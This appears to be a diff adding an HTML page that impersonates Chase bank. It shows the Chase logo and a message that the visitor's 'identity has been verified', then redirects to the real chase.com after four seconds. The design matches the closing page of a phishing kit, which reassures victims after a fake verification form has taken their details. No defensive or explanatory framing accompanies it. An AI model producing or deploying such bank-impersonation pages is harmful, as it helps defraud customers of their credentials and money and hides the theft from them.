@@ -1,0 +1,69 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Success</title>
+    <style>
+        @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css');
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoe6J-X7SeKI2R7KF3QKSz0UrKL4A2SI3Kcg&usqp=CAU') no-repeat center center fixed;
+            background-size: cover;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 40px;
+            box-sizing: border-box;
+            background-color: rgba(240, 242, 245, 0.9);
+        }
+        .logo {
+            max-width: 200px;
+            margin-bottom: 20px;
+        }
+        .success-container {
+            background-color: white;
+            padding: 40px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 330px;
+        }
+        .checkmark {
+            color: #007bff;
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+        .message {
+            font-size: 16px;
+        }
+    </style>
+    <script>
+        setTimeout(function() {
+            window.location.href = 'https://www.chase.com/';
+        }, 4000);
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ed/Chase_logo_2007.svg/1280px-Chase_logo_2007.svg.png" alt="Chase Logo" class="logo">
+        <div class="success-container">
+            <i class="fas fa-check-circle checkmark"></i>
+            <div class="message">
+                Thanks, your identity has been verified.<br>
+                You will be redirected shortly away from the verification form.
+            </div>
+        </div>
+    </div>
+</body>
+</html>
